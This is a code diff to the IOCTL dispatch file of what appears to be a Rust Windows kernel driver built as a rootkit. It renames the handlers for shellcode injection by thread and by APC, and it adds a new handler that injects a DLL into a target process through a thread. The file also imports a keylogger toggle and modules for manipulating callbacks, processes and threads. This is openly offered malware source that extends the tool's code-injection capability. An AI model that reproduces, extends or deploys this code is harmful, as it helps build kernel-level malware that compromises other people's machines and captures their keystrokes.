@@ -1,7 +1,8 @@
 use {
     crate::{
-        *, callbacks::{Callback, CallbackRegistry, CallbackOb, CallbackList}, 
-        driver::Driver, injection::InjectionShellcode, keylogger::set_keylogger_state, 
+        *, 
+        callbacks::{Callback, CallbackRegistry, CallbackOb, CallbackList}, 
+        driver::Driver, injection::{InjectionShellcode, InjectionDLL}, keylogger::set_keylogger_state, 
         module::Module, process::Process, thread::Thread
     }, 
     alloc::boxed::Box, 
@@ -14,6 +15,7 @@ use {
     }, 
     wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS} 
 };
+
 
 #[cfg(not(feature = "mapper"))]
 use {
@@ -149,16 +151,23 @@ lazy_static! {
             status
         }) as IoctlHandler);
 
-        ioctls.insert(IOCTL_INJECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-            log::info!("Received IOCTL_INJECTION_THREAD");
+        ioctls.insert(IOCTL_INJECTION_SHELLCODE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_INJECTION_SHELLCODE_THREAD");
             let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_thread, TargetInjection) };
             unsafe { (*irp).IoStatus.Information = 0 };
             status
         }) as IoctlHandler);
 
-        ioctls.insert(IOCTL_INJECTION_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
-            log::info!("Received IOCTL_INJECTION_APC");
+        ioctls.insert(IOCTL_INJECTION_SHELLCODE_APC, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_INJECTION_SHELLCODE_APC");
             let status = unsafe { handle_injection!(stack, InjectionShellcode::injection_apc, TargetInjection) };
+            unsafe { (*irp).IoStatus.Information = 0 };
+            status
+        }) as IoctlHandler);
+
+        ioctls.insert(IOCTL_INJECTION_DLL_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
+            log::info!("Received IOCTL_INJECTION_DLL_THREAD");
+            let status = unsafe { handle_injection!(stack, InjectionDLL::injection_dll_thread, TargetInjection) };
             unsafe { (*irp).IoStatus.Information = 0 };
             status
         }) as IoctlHandler);
